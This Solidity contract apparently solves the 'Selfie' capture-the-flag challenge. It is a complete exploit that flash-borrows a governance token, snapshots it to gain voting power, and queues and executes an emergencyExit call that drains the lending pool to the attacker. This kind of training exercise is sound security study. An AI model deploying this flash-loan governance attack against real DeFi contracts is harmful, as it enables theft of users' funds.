// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import { SelfiePool } from "./SelfiePool.sol";
import { SimpleGovernance } from "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";


contract HackSelfie is IERC3156FlashBorrower {
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot token;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    uint256 actionId;
    
    constructor(SelfiePool _pool, SimpleGovernance _governance, DamnValuableTokenSnapshot _token) {
        pool = _pool;
        governance = _governance;
        token = _token;
    }

    function hack(uint256 amount) public {
        // We need to call the flashLoan function inside the SelfiePool
        // Also, we're going to pass the emergencyExit function signature as argument
        pool.flashLoan(this, address(token), amount, abi.encodeWithSignature("emergencyExit(address)", tx.origin));
    }


    function onFlashLoan(address _initiator, address _token, uint256 amount, uint256 fee, bytes calldata data) public returns (bytes32) {
        // First, we're going to take a snapshop so we update our governance token balance
        token.snapshot();
        // Then we're going to set an action queue
        actionId = governance.queueAction(address(pool), 0, data);
        // And we're going to approve the pool to return their token balance
        token.approve(address(pool), amount);
        return CALLBACK_SUCCESS;
    }
    
    function execute() public {
        // We will execute the action after two days have passed
        governance.executeAction(actionId);
    }


}